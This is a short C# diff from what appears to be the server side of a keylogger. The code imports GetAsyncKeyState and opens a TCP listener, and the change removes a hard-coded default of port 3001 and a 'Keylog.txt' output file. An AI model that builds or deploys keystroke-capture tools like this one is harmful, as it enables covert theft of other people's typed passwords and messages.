@@ -16,7 +16,6 @@ namespace Server
         public static extern int GetAsyncKeyState(int i);
         static void Main(string[] args)
         {
-            args=new string[]{"3001", "Keylog.txt"};
             TcpListener Listener = new TcpListener(IPAddress.Any, Int32.Parse(args[0]));
             Listener.Start();
             Console.WriteLine("Servidor funcionando en puerto ("+args[0]+")");
